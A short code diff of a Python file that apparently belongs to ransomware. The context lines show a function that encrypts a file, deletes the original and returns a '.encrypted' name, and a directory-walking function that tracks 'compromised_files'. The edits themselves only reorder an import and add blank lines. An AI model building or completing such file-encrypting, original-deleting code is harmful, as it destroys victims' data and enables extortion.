@@ -1,7 +1,7 @@
 import os
 from Crypto.Cipher import AES, PKCS1_OAEP
-from Crypto.Util.Padding import pad
 from Crypto.Random import get_random_bytes
+from Crypto.Util.Padding import pad
 from Crypto.PublicKey import RSA
 
 
@@ -37,6 +37,8 @@ def encrypt(file, shared_key):
 
     os.remove(file)
     return f"{file}.encrypted"
+
+
 
 def encrypt_walk(shared_key):
     compromised_files = []
